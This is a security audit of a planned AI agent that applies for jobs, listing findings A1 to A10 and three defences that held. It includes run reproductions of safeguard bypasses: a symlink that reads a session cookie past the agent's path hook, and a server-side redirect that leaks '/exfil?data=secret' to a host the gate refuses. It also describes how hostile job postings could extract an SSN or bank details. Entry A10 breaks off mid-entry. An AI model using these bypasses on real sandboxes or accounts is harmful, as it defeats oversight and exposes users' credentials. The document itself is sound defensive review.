## Findings

### A1 (high, CONFIRMED) Path scope is lexical, so the profile, upload and slice guards that lean on it can be walked around with a symlink, and Bash is not scoped at all

- **Where:** THREATS D5 ("the agent's file tools cannot read it (path scope)"), B7 ("resolved through `realpath`"), TEAM-COMPOSITION V8 ("a builder's write scope is its slice") and G8 ("slice scope in the path hook"). Code: `src/hooks.ts:131-136` (`isInside` uses `path.resolve`, not `realpathSync`), `src/hooks.ts:139-144` (the code's own comment: Bash "can still `cd` or `cat` anywhere"), `src/phases.ts:110,123,142` (builder, verifier and gatekeeper all get `Bash`).
- **Problem:** Three planned "code" stops reuse `createPathScopeHook` without saying it has to change. That hook compares strings, not real paths. A symlink inside `--dir` that points at the agent profile goes straight through it, and so does a symlink inside a slice that points into another slice. B7 promises `realpath` for uploads, but D5 and V8 promise nothing like it. And any role with Bash (today: builder, verifier, gatekeeper; in the roster: builder, verifier, integrator, perf-reviewer, "read + run" roles) can `cat` the Cookies DB or `sed -i` a file in another slice. Neither the hook nor the plan stops that.
- **Reproduction (run, against `dist/hooks.js`):** a scratch script makes `work/` and `agent-profile/Default/Cookies` with the content `li_at=SECRET_SESSION_COOKIE`, then runs `ln -s ../agent-profile work/docs-link`, then sends `Read work/docs-link/Default/Cookies` through `createPathScopeHook(work)` and `createSensitiveFileHook()`. Output:
  ```
  path-scope decision: {}
  sensitive-file decision: {}
  what Read would return: li_at=SECRET_SESSION_COOKIE
  direct path decision: deny
  ```
  The direct path is denied and the symlinked path is allowed. A cloned repo can ship that symlink, so a read-only `researcher` or `security-reviewer` is exposed too (TEAM-COMPOSITION gives them Read on the repo).
- **Harm:** the LinkedIn/Indeed session cookie ends up in a model transcript and then in the "keep everything" store (`log_index` holds tool-result summaries, `src/phases.ts:310`). The two parallel-slice builders also collide even though V8 passes.
- **What would fix the test, not just the code:** the D5 and G8 tests have to include a symlink case and a Bash case. As planned ("Read tool on a profile path; denied", "builder write outside slice denied") they test the direct path only, so they pass with the bug still there.

### A2 (critical, CONFIRMED) The route gate never sees HTTP redirect hops: the "already built" TEST boundary leaks today, and LIVE's "off-list redirect parks and asks" cannot work as designed

- **Where:** SPEC "Modes and the allowances list": TEST mode is "Already built and tested", and "A redirect off the list is a navigation attempt and is judged like one ... parks the item and asks". THREATS C4 and D1 (stop: "**code**: route-level gate on navigations and frames"). Code: `src/browser-tools.ts:239-243` (one `context.route("**/*")` check per request).
- **Problem:** Playwright calls a route handler once per request, for the *first* URL only. A 3xx is followed inside the browser, the handler never sees it, and the off-list host gets the request (with its cookies, a Referer, and any query string the redirector chose). The installed typings say so: `node_modules/playwright-core/types/types.d.ts:4413`, "**NOTE** The handler will only be called for the first url if the response is a redirect." The plan's whole LIVE redirect story ("aggregators redirect to ATS sites constantly, so an off-list redirect parks the item and asks") assumes the gate gets to judge each hop. It does not. By the time code can notice (`framenavigated`), the off-list page has already loaded and run its scripts.
- **Reproduction 1, today's TEST gate (run against `dist/browser-tools.js`, `__testHandlers`):** a server on `127.0.0.2` (not matched by `LOCAL_URL_RE`), and a server on `127.0.0.1` that answers `302 Location: http://127.0.0.2:<p>/exfil?data=secret`. Output:
  ```
  open(direct 127.0.0.2): Error: Refused: only http://localhost or http://127.0.0.1 URLs are allowed in this stage ...
  open(local redirector): Opened http://127.0.0.1:39285/ in t1. Title: OUTSIDE
  inspect: URL: http://127.0.0.2:46409/exfil?data=secret | Title: OUTSIDE
  requests that reached the outside host: [ '/exfil?data=secret' ]
  ```
  The direct open is refused, and the same host is reached through one redirect.
- **Reproduction 2, the LIVE shape:** the same `context.route` with an allowlist of one origin, and a link on the allowed page that 302s to a second origin. The route handler saw only `[ '/', '/jump' ]`, the off-list server logged `/landed`, and the page ended there with title `OFF-LIST`.
- **Harm:** an allowed aggregator (or a hostile posting on it, C1) can send the logged-in browser to any host, including a credential-phishing look-alike, and the agent then fills it from `facts.json`. The planned C4/D1 tests ("Aggregator redirect to an unlisted ATS; asks") pass only if the fake board redirects *client-side* (link or JS). A server-side 302, which is how real aggregators redirect, is the case they skip.
- **What it needs:** either `route.fetch({ maxRedirects: 0 })` and re-issuing each hop through the gate yourself, or a check of `request.redirectedFrom()` in a `request` listener that aborts the follow-up. Plus a test where the fake board answers 302/307/308 and `Refresh:` headers. Say in the docs that a redirect to a private address (D2) is also reached this way.

### A3 (high, CONFIRMED) Variable teams and per-job items are invisible to today's lineage, stepper and Overseer: two builders merge into one node, and every non-built-in role disappears

- **Where:** TEAM-COMPOSITION "Built vs to build" ("`PhaseName` widens to a role id string with `BUILTIN_ROLES` kept for the existing UI", "Events gain optional `stepId`, `role`, `instance`", "the lineage tree groups by slice"). SPEC "Flows and skills" ("Events carry an `item` label ... The five role names are kept so the existing UI keeps working"). Code: `src/lineage.ts:105` (`isPhase` = membership in `PHASES`), `src/lineage.ts:146` (node id is `${phase}#${attempt}`), `src/lineage.ts:284` (lanes from `PHASES.indexOf`), `ui/index.html:535` (stepper hard-codes the five names), `src/overseer.ts:58` (an attempt above `maxRetries` skips the model and returns a canned decision), `src/pipeline.ts:76,106` (attempt counter keyed by phase name only).
- **Problem:** The two documents propose two different event extensions: SPEC adds `item`, TEAM-COMPOSITION adds `stepId/role/instance`. Neither says what the lineage *key* becomes. Today the key is `phase#attempt`, and anything whose `phase` is not one of the five is dropped. "Keep the five role names so the UI works" and "widen to a role string" contradict each other. If the five names are kept, 30 per-job builders either all collapse into `builder#1`, or get attempts 1..30. Attempts above `maxRetriesPerPhase` (default 2) hit `overseer.ts:58`, which ends the Overseer's judgement after the third job, and lineage reads attempt 2+ as "retry".
- **Reproduction (run, against `dist/lineage.js`):** feed `buildLineage` the event stream of the TEAM-COMPOSITION example: builder s3 (slice api), builder s5 (slice ui), integrator s7, security-reviewer s8 with outcome `fail`. Output:
  ```
  nodes: [ 'builder#1 headline="ui slice" toolCalls=1' ]
  agents: [ 'builder x1' ]
  ```
  The api slice's builder is overwritten by the ui slice's builder. The integrator and the **failing mandatory security review** are not in the tree at all, so a reader of the lineage report sees a one-builder run with no failure.
- **Harm:** the "reason shown in the UI" principle (TEAM-COMPOSITION principle 1) and the audit trail fail silently, and the failure that hides is exactly the mandatory-reviewer one. The S3a exit criterion "the UI renders a 3-step, a 5-step and a 12-step run" can pass on the stepper while the lineage is wrong, because nothing asserts node identity.
- **What it needs:** one decision, written in both documents, on the identity of a unit of work (`goal/item/stepId/attempt`). Lineage, store, persona and the stepper all keyed on it. A test that runs two same-role steps and a non-built-in role through `buildLineage` and asserts distinct nodes.

### A4 (medium, CONFIRMED) The usage governor's "documented" source is the undocumented endpoint, and its signal only arrives while a model call is running and only when something changes

- **Where:** SPEC "Usage governor" ("reads those, **not** the undocumented usage endpoint", "exposes `rate_limits` on its status call"). THREATS E1 and TEAM-COMPOSITION V9/G9 (stop: **code**). Installed SDK 0.3.280: `node_modules/@anthropic-ai/claude-agent-sdk/sdk.d.ts:2901` (the status call is `usage_EXPERIMENTAL_MAY_CHANGE_DO_NOT_RELY_ON_THIS_API_YET`), `:4084` ("Plan rate-limit utilization windows **from the claude.ai usage endpoint**"), `:5408` ("Rate limit event emitted **when rate limit info changes**"), `:5425,5427` (`resetsAt?` and `utilization?` are optional).
- **Problem:** (1) The spec contradicts itself. The `rate_limits` it plans to read *is* the usage endpoint, reached through an API whose name says not to rely on it. (2) `rate_limit_event` is a message inside a `query()` stream, sent on change. Between items, while the queue waits out the 60 to 180 s gap or a parked item, no query is running, so the governor has no signal. It also cannot know where it stands at start-up without the experimental call. (3) `utilization` and `resetsAt` are optional, so "pause with the reset time shown" and "resume at the reset time" can have no time to use. (4) V9 asks for an "estimated cost class" against "the remaining usage allowance", but a percentage of a five-hour window is not something a plan can be priced against. Nothing in the SDK turns "12 agents" into percentage points.
- **Argument / reproduction:** read the four cited lines. Today none of `src/*.ts` handles `rate_limit_event` (`grep -n rate_limit src/*.ts` prints nothing), so every query site (the five phases, the Overseer, and the planned router, composer, advisor and watchdog glance) has to forward it. The planned E1 test uses a "fake SDK [that] emits the events", so it passes even if the real SDK never emits `allowed_warning` before `rejected`, or omits `resetsAt`.
- **Harm:** on a subscription plan the first sign of trouble can be a `rejected` in the middle of an item. For the job flow that can land between filling and confirming, which leaves exactly the half-done state the ledger is meant to avoid.
- **What it needs:** treat "no signal" as "unknown, slow down", not "fine". Make the E1 test include a stream with `rejected` and no prior warning and no `resetsAt`. Drop the "not the usage endpoint" sentence or say plainly that the experimental API is the source.

### A5 (high, CONFIRMED by the documents' own text) Mandatory reviewers are chosen from a forecast of the change, made before any code exists; a task that drifts into auth after planning never gets its security reviewer

- **Where:** TEAM-COMPOSITION "How the size is chosen", layer 1 ("Signals ... computed from the task text and a cheap repo scan: **estimated** files touched ... sensitive-path hits"), V4 ("Roles flagged mandatory by signal cannot be dropped"), G2. Nothing in "What code enforces" or "Changes during the run" re-computes signals from the **actual** diff.
- **Problem:** V4 protects a reviewer once a signal has fired. Nothing makes the signal fire on what was actually changed. The signal is a prediction from words and a scan. The words come from the user (or, for C3-style input, from someone else), and the scan cannot know which files the builder will touch. A one-builder, three-agent plan has one slice whose scope is whatever the composer wrote.
- **Scenario:**
  1. Task: "tidy the helpers in src/util and make the date formatting consistent". No sensitive words, and the scan hits `src/util/**`, so the composer gives builder, verifier, gatekeeper (sizing row 1). No security reviewer.
  2. The builder finds that `src/util/date.ts` is imported by `src/auth/session.ts` for token expiry, and "makes it consistent" by changing the expiry arithmetic (seconds to milliseconds).
  3. If the slice is `src/util/**`, the path hook only covers Write/Edit, so the builder changes `src/auth/session.ts` through Bash (A1). Or it never touches auth at all, and the auth behaviour changes through the shared helper anyway.
  4. The verifier runs the util tests, which pass. The gatekeeper reads the diff, which touches only util. Expiry is now 1000 times longer, and no security-reviewer ever ran, because V4 had nothing to protect.
- **Also evadable by wording:** the read-only intent marker ("explain", "find", "why does") decides whether V2's floor applies at all ("A task that writes or acts"). "Find out why login fails and patch it" carries both kinds of marker, and the documents do not say which one wins.
- **What it needs:** a post-build gate that recomputes the sensitive-path signal from the real diff, plus the transitive importers of changed files, and appends the mandatory reviewer through V11 if it is missing. Then a G2 test where the task text is innocent and the diff is not. The planned G2 test ("Task and repo text telling it to skip") checks only the composer stage.

### A6 (medium, CONFIRMED for items 2-5; item 1 UNCONFIRMED here, needs a macOS or Windows run) Slices that pass the V8 glob check still collide on case-insensitive disks, on shared files and through Bash

- **Where:** TEAM-COMPOSITION "The team plan" ("overlapping slice globs are rejected ... so two builders cannot edit the same file"), V8, G8. SPEC "Staged plan" (CI on Linux, macOS and Windows).
- **Problem and concrete cases:**
  1. **Case folding:** `src/API/**` and `src/api/**` do not overlap as strings. On default macOS (APFS, case-insensitive) and Windows (NTFS), they are the same directory. The S0 CI matrix includes both.
  2. **Shared files nobody owns:** two slices that each add a dependency both rewrite `package.json` and `package-lock.json` (or `pnpm-lock.yaml`). Two slices that each add a route both edit `src/index.ts` or a barrel file. Neither builder can finish without writing outside its slice, so either the plan fails (V8 working) or the builder uses Bash (A1). The plan has no "shared paths" concept and no rule that only the integrator may touch them.
  3. **Generated outputs:** `npm run build` or a snapshot update run by builder A rewrites `dist/**` or `__snapshots__/**`, which builder B also regenerates. The writes come from a child process, so no path hook sees them.
  4. **Glob intersection is not string overlap:** `src/**/api/*.ts` against `src/api/**`, or `src/{a,b}/**` against `src/b/x/**`. The documents do not say which glob dialect or which intersection algorithm, so "rejected" is unspecified.
  5. **Symlinks:** `src/ui/shared -> ../api/shared` passes any glob check, and `isInside` follows the lexical path (A1).
- **Why the planned test does not prove the claim:** G8 is "Overlapping globs rejected; builder write outside slice denied". Both checks pass while all five collisions above remain, because the plan's examples are disjoint lowercase trees with no shared manifests.
- **What it needs:** normalise case on case-insensitive platforms, realpath every path, keep a reserved list of shared paths (manifests, lockfiles, entry points, generated dirs) that only the integrator may write, and add a test per case above.

### A7 (high, CONFIRMED by the documents' own text) The pre-submit diff proves an answer is *true*, not that it should be *given*: a fake posting that asks for SSN or bank details gets correct answers

- **Where:** SPEC "Facts and form answers" (`facts.json` holds "name, contact, work authorisation ... salary range"; "code **diffs** the filled form against facts"). THREATS B3 (the stop blocks "any mismatch or unsourced value") and D6 (expects "SSN-shaped" secrets *inside* `facts.json`). "What this model does not cover" mentions a wrong facts file, but not a right facts file given to the wrong party.
- **Problem:** B3's diff blocks false answers. A field whose value matches `facts.json` passes by construction. D6 confirms the plan expects SSN-shaped values in facts, and redacts them from *logs*, but nothing limits which *forms* may receive them. Fake postings are a real, common threat to job seekers. The FTC says scammers copy real employers' ads onto job boards and "ask for information like your Social Security and bank account number", and "Real employers won't ask for that kind of information before they've actually interviewed and hired you" (FindLaw summary of the FTC alert: https://www.findlaw.com/legalblogs/law-and-life/ftc-warns-job-seekers-about-scammers-on-the-prowl/; ConsumerAffairs: https://www.consumeraffairs.com/news/look-out-fake-job-offers-want-your-money-and-your-private-info-070825.html).
- **Scenario:**
  1. A scam posting on an allowed board (Indeed or LinkedIn both carry them) links to an "application" form on the board itself or on an ATS-looking host. The user said "yes" to that host once (SPEC: remembered "for that host for that goal").
  2. The form asks for date of birth, SSN ("for background check"), and bank routing ("for direct deposit").
  3. If any of these are in facts (D6 says SSN-shaped values may be), the executor fills them. B3's diff finds no mismatch. B4 does not fire because the field is answerable. Submit goes through, and B5 sees a matching job id.
  4. Result: identity-theft material handed to a fraudster, with the ledger saying "confirmed".
- **Why no planned test catches it:** B3's test is "fake executor invents an answer; assert 0 submissions". A truthful answer to an inappropriate question is the case left out. B6 (exclusions) and C1 (injection text) do not apply, because the scam form contains no injection and no excluded company.
- **What it needs:** a disclosure class on every fact (`public`, `application`, `post-offer-only`, `never-autofill`) enforced by code at fill time, a rule that `post-offer-only` and `never-autofill` fields always park and ask, a fraud row in THREATS (scam posting / off-platform "application"), and a fake-board scenario that asks for SSN and bank details on a posting that is otherwise normal.

### A8 (medium, CONFIRMED by the documents' own text) "Demographic question means ask the user" lasts exactly one employer: the answer is saved to facts and then auto-filled everywhere

- **Where:** SPEC "Facts and form answers" ("a demographic question ... the item is parked and the user asked; **the answer is saved to facts with the question text**"). THREATS B4 ("required-and-**unanswerable** → park; answer saved to facts"). SPEC "The learning loop" ("The same question asked of the user", which becomes a facts entry).
- **Problem:** B4 parks only when facts *cannot* answer. After the first demographic question (disability status, veteran status, race and ethnicity, gender, which are voluntary self-identification fields on US applications), the answer is in facts, so every later employer's version is "answerable" and gets auto-filled. That is true whether or not the user meant to disclose it to that employer. The learner then makes the reuse official. The same applies to legal attestations ("I certify that ..."): SPEC lists them as park-and-ask, and the save rule turns them into answers given automatically from then on.
- **Scenario:** the user answers "Yes, I have a disability" once, for a disability-inclusive employer they chose. Over the next 29 applications that day, every self-identification page gets "Yes" without a prompt. The user sees nothing, because nothing parked.
- **Why the planned test misses it:** B4's test asserts "after the answer is added, the next run submits". That is the leak, written as the success condition.
- **What it needs:** demographic and attestation answers stored with scope (`this employer only`, `always ask`, `always decline`), with "always ask" as the default, and a test that the second employer's demographic page parks again.

### A9 (medium, CONFIRMED by the documents' own text plus public sources) The watchdog's ban monitors are an English phrase list and three status codes: a security-job posting pauses LinkedIn for good, and LinkedIn's own block code is not on the list

- **Where:** SPEC "Overseer, Advisor, Watchdog" (monitors: "challenge/ban text ('verify you are human', 'unusual activity', 'temporarily restricted', 'access denied') and HTTP 403/429/503-with-Retry-After"). THREATS A1 to A4 (A4: "Text on any page" → pause site). SPEC "Decisions": challenges mean "pause that site ... never auto-resume".
- **False pause (scenario):** the goal is "apply to 30 backend/security jobs". Item 4 is a SOC analyst posting whose description reads "monitor for unusual activity, triage access denied events". A4's monitor matches "unusual activity" and "access denied" on a page, and the site is paused. The plan says it is never auto-resumed, so the remaining 26 items on LinkedIn wait for a human. The same happens on purpose if any posting contains the phrase, so any poster can stop the agent on that site. A4's planned test ("Board serves the notice mid-run") has no negative control, so a monitor that matches anywhere passes.
- **Missed ban (fact):** LinkedIn answers suspected automation with the non-standard status **999 Request Denied** (http.dev: https://http.dev/999, "LinkedIn is one service that returns this HTTP status code"; uptimerobot: https://uptimerobot.com/blog/999-status-code). 999 is not 403, 429 or 503, so A1 and A2 never trip, and the agent keeps working against a site that has already said no. That breaks the non-goal "A site that says no is a site we stop using".
- **Missed ban (language):** a user whose LinkedIn UI is German, Spanish or Hindi gets the restriction notice in that language, and no English phrase matches. The facts file and the spec assume English throughout.
- **What it needs:** match ban text only where it is page chrome (status, title, top-level banner, the login/checkpoint URL patterns), not in posting bodies. Treat any non-2xx/3xx document status outside a small allowlist (including 999) as "site said no". Make the phrase list per locale. Give A3/A4 a negative test: a posting body that contains every trigger phrase must **not** pause the site.

### A10 (high, CONFIRMED) The page reader every form check would be built on is blind to iframes and shadow DOM, and Greenhouse's standard embed is an iframe

- **Where:** SPEC "Facts and form answers" (code diffs the filled form against facts). THREATS B3 (pre-submit diff), B5 ("Verifier compares page job id and title with the item"), C2 ("code flags text that is hidden but present"). SPEC "Job sources" (Greenhouse/Lever/Workday style forms). ## Three things the plan gets right that I tried and failed to break

1. **Pipeline code, not the Overseer's text, decides whether a run may continue.** I looked for a way for a "continue" to carry a non-pass verdict forward: an unparseable Overseer reply, an invalid repair target, a verdict with `completed: "false"` as a string. `src/pipeline.ts:197-203` turns "continue" on a non-pass into a repair, `parseVerdict` (`src/phases.ts:349-386`) fails closed to `inconclusive`, and an invalid repair target falls back to the same phase on both sides (`src/overseer.ts:133-137`, `src/pipeline.ts:250-251`). TEAM-COMPOSITION V12 builds on this, and it holds.
2. **Element refs cannot be forged or moved by the page.** I tried to get a ref pointing at a different element after a re-render, a navigation or a tab switch. Refs map to `ElementHandle`s held in the agent's process (`src/browser-tools.ts`, `RefSnapshot`), not to DOM attributes. Stale refs and stale screenshot ids are refused on navigation, tab change, resize and scroll, and ref lines are JSON-quoted so page text cannot forge an extra `[sNeM]` entry. I found no way for page script to retarget a click.
3. **The approval channel is closed to pages and other local processes.** In TEST mode the agent's own browser can reach any localhost port, including the UI server, so I tried to have a page approve its own tool calls. `src/server.ts` requires a matching Host header, an Origin equal to the UI's own origin (a fake-board page on another port fails), and a per-run token that lives in the URL fragment and is never sent to the server in a request line. A page served by the UI itself has no token. I could not get a connection that passes all three.
